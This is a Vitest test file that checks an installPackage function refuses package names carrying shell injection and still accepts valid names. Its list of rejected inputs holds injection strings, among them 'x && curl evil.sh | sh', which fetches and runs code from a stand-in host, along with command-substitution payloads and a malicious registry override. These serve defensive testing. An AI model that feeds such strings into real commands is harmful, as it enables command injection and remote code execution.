import { exec, execFile } from 'node:child_process'
import { beforeEach, describe, expect, test, vi } from 'vitest'
import { installPackage } from './package-manager'

// Never run a real command: both exec and execFile are fakes.
vi.mock('node:child_process', () => {
  const exec = vi.fn((_command: string, callback) => callback(null))
  const execFile = vi.fn((_file: string, _args: Array<string>, callback) =>
    callback(null),
  )
  return { default: { exec, execFile }, exec, execFile }
})

describe('installPackage', () => {
  beforeEach(() => {
    vi.mocked(exec).mockClear()
    vi.mocked(execFile).mockClear()
  })

  test.each([
    'x; touch /tmp/pwned; #',
    'x && curl evil.sh | sh',
    'x & calc.exe',
    '$(touch /tmp/pwned)',
    '`touch /tmp/pwned`',
    '%COMSPEC%',
    'x\ntouch /tmp/pwned',
    '--registry=https://evil.example',
    '',
  ])('rejects %j without running the package manager', async (name) => {
    const result = await installPackage(name)

    expect(result.success).toBe(false)
    expect(exec).not.toHaveBeenCalled()
    expect(execFile).not.toHaveBeenCalled()
  })

  test.each([
    '@tanstack/react-query-devtools',
    '@tanstack/react-query@^5.90.1',
    'some-package',
    'some_package.js@1.0.0-beta.1',
  ])('installs %j', async (name) => {
    const result = await installPackage(name)

    expect(result.success).toBe(true)
    if (process.platform === 'win32') {
      expect(vi.mocked(exec).mock.calls[0]![0]).toMatch(
        new RegExp(` ${name.replace(/[.^]/g, '\\$&')}$`),
      )
    } else {
      expect(vi.mocked(execFile).mock.calls[0]![1]).toContain(name)
    }
  })
})
